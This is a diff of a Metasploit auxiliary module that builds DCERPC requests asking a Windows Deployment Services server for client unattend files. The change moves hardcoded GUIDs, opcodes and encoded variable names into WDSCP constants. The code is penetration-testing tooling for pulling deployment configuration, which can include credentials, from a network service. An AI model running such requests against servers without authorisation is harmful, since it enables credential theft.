@@ -7,12 +7,15 @@
 
 require 'msf/core'
 require 'rex/proto/dcerpc'
+require 'rex/proto/dcerpc/wdscp'
 require 'rex/parser/unattend'
 
 load '/opt/metasploit/msf3/lib/rex/parser/unattend.rb'
 load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/client.rb'
 load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/packet.rb'
 load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/handle.rb'
+load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/wdscp.rb'
+load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/wdscp/constants.rb'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -23,6 +26,8 @@ class Metasploit3 < Msf::Auxiliary
     DCERPCClient   = Rex::Proto::DCERPC::Client
     DCERPCResponse = Rex::Proto::DCERPC::Response
     DCERPCUUID     = Rex::Proto::DCERPC::UUID
+	
+	WDS_CONST 	= Rex::Proto::DCERPC::WDSCP::Constants
 
 	
 	def initialize(info = {})
@@ -90,7 +95,7 @@ class Metasploit3 < Msf::Auxiliary
 	
 	def run 
 		# Create a handler with our UUID and Transfer Syntax
-		self.handle = Rex::Proto::DCERPC::Handle.new(	['1a927394-352e-4553-ae3f-7cf4aafca620', '1.0','71710533-beba-4937-8319-b5dbef9ccc36', 1],
+		self.handle = Rex::Proto::DCERPC::Handle.new(	[WDS_CONST::WDSCP_RPC_UUID, '1.0','71710533-beba-4937-8319-b5dbef9ccc36', 1],
 														'ncacn_ip_tcp', 
 														rhost, 
 														[datastore['RPORT']])
@@ -132,15 +137,15 @@ class Metasploit3 < Msf::Auxiliary
 		print_line table.to_s
 	end
 	
-	def variable_description_block(name, value_type, type_mod=0, value_length=nil, array_size=0, value)
+	def variable_description_block(name, type_mod=0, value_length=nil, array_size=0, value)
 		padding = 0	
+		value_type = WDS_CONST::BASE_TYPE[WDS_CONST::VAR_TYPE_LOOKUP[name]]
+		name = name.encode('UTF-16LE').unpack('H*')[0]
 		
-		if value_length.nil?
-			value_length = value.length
-		end
-		
+		value_length ||= value.length
+
 		len = 16 * (1 + (value_length/16)) # Variable block total size should be evenly divisible by 16.
-		return [name, padding, value_type, type_mod, value_length, array_size, value].pack('a66vvvVVa%i' % len)
+		return [name, padding, value_type, type_mod, value_length, array_size, value].pack('H132vvvVVa%i' % len)
 	end
 	
 	def request_client_unattend(architecture)	
@@ -150,75 +155,44 @@ class Metasploit3 < Msf::Auxiliary
 		endpoint_header = 	[	40, 																# Header Size
 								256, 																# Version
 								528,																# Packet Size
-								"\x5a\xeb\xde\xd8\xfd\xef\xb2\x43\x99\xfc\x1a\x8a\x59\x21\xc2\x27", # GUID
+								WDS_CONST::OS_DEPLOYMENT_GUID, # GUID (OS Deployment endpoint GUID)
 								"\x00"*16															# Reserved
 							].pack('vvVa16a16')
 							
-		operation_header = [ 	528,							# PacketSize
-								256, 							# Version
-								@pkt_type['request'], 			# Packet_Type
-								0, 								# Padding
-								@opcode['GET_CLIENT_UNATTEND'], # Opcode
-								4,								# Variable Count
+		operation_header = [ 	528,										# PacketSize
+								256, 										# Version
+								WDS_CONST::PACKET_TYPE[:REQUEST], 			# Packet_Type
+								0, 											# Padding
+								WDS_CONST::OPCODE[:GET_CLIENT_UNATTEND], 	# Opcode
+								4,											# Variable Count
 							].pack('VvCCVV')					
 		
+		
 		architecture_description_block = variable_description_block(
-											"\x41\x00\x52\x00\x43\x00\x48\x00\x49\x00\x54\x00\x45\x00\x43\x00"\
-											"\x54\x00\x55\x00\x52\x00\x45\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
-											"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
-											"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
-											"\x00\x00",				# Name
-											@base_type['ULONG'], 	# Base Type
-											@type_modifier['NONE'], # Type Modifier
-											4, 						# Value Length
-											0, 						# Array Size
+											WDS_CONST::VAR_NAME_ARCHITECTURE, # Name
 											[architecture[1]].pack('C') # Value						
 										)
 
 		client_guid_variable = variable_description_block(
-											"\x43\x00\x4c\x00\x49\x00\x45\x00\x4e\x00\x54\x00\x5f\x00\x47\x00"\
-											"\x55\x00\x49\x00\x44\x00\x00\x00\x49\x00\x44\x00\x00\x00\x00\x00"\
-											"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
-											"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
-											"\x00\x00",
-											@base_type['WSTRING'],
-											@type_modifier['NONE'],
-											66,
-											0,
+											WDS_CONST::VAR_NAME_CLIENT_GUID,
 											"\x35\x00\x36\x00\x34\x00\x44\x00\x41\x00\x36\x00\x31\x00\x44\x00"\
 											"\x32\x00\x41\x00\x45\x00\x31\x00\x41\x00\x41\x00\x42\x00\x32\x00"\
 											"\x38\x00\x36\x00\x34\x00\x46\x00\x34\x00\x34\x00\x46\x00\x32\x00"\
 											"\x38\x00\x32\x00\x46\x00\x30\x00\x34\x00\x33\x00\x34\x00\x30\x00"\
-											"\x00\x00\x61\x00\x38\x00\x39\x00\x00"
+											"\x00\x00"
 										)
 											
 		client_mac_variable = variable_description_block(
-											"\x43\x00\x4c\x00\x49\x00\x45\x00\x4e\x00\x54\x00\x5f\x00\x4d\x00"\
-											"\x41\x00\x43\x00\x00\x00\x36\x6f\x31\x33\x37\x3c\x08\x4d\x53\x46"\
-											"\x54\x20\x35\x2e\x30\x37\x0c\x01\x0f\x03\x06\x2c\x2e\x2f\x1f\x21"\
-											"\x79\xf9\x2b\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
-											"\x00\x00",
-											@base_type['WSTRING'],
-											@type_modifier['NONE'],
-											66,
-											0,
+											WDS_CONST::VAR_NAME_CLIENT_MAC,
 											"\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00"\
 											"\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00"\
 											"\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x35\x00\x30\x00"\
 											"\x35\x00\x36\x00\x33\x00\x35\x00\x31\x00\x41\x00\x37\x00\x35\x00"\
-											"\x00\x00\x12\x00\x00\x00\x00\x00\x00"
+											"\x00\x00"
 										)
 
 		version_variable = variable_description_block(
-											"\x56\x00\x45\x00\x52\x00\x53\x00\x49\x00\x4f\x00\x4e\x00\x00\x00"\
-											"\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
-											"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"\
-											"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
-											"\x00\x00",
-											@base_type['ULONG'],
-											@type_modifier['NONE'],
-											4,
-											0,
+											WDS_CONST::VAR_NAME_VERSION,
 											"\x00\x00\x00\x01\x00\x00\x00\x00"
 										)
 		
